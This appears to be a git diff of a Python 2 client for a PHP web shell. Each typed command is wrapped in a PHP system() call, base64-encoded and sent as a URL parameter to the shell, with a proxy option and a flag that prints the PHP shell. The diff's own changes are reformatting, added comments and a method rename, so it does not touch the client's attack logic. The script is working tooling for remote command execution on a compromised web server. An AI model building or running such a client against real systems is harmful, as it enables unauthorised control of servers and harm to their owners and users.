@@ -11,12 +11,13 @@ from optparse import OptionParser
 
 
 http_headers = {
-                    "Content-Type": "application/x-www-form-urlencoded"
-                }
+               "Content-Type": "application/x-www-form-urlencoded"
+               }
 
 optionsp = OptionParser()
 optionsp.add_option("-u", "--url", type="string", dest="url", help="Shell url")
-optionsp.add_option("-p", "--proxy", type="string", dest="proxy", help="Proxy server")
+optionsp.add_option("-p", "--proxy", type="string",
+                    dest="proxy", help="Proxy server")
 optionsp.add_option("-s", action="store_true", help="Print the php shell")
 (options, args) = optionsp.parse_args(sys.argv)
 
@@ -38,9 +39,16 @@ class rshell(Cmd):
         print "Write the command to send to server shell"
 
     def default(self, line):
+        #This is the default command method
+        #system function is called with the command to execute
         s = "system('{0}');".format(line)
-        url = self.shell_url + '?param=' + quote_plus(base64.encodestring(s)[:-1])
-        self.make_request(url)
+        #building url
+        url = self.shell_url + '?param='
+        #adding base64 encoded parameter
+        #the [:-1] is because encodestring add a \n at the end
+        url += quote_plus(base64.encodestring(s)[:-1])
+        #doing the request to the server
+        self.dorequest(url)
 
     def do_quit(self, line):
         exit(0)
@@ -48,7 +56,7 @@ class rshell(Cmd):
     def do_exit(self, line):
         exit(0)
 
-    def make_request(self, fullurl):
+    def dorequest(self, fullurl):
         parsed_url = urlparse(fullurl)
         url = ''
         con = None
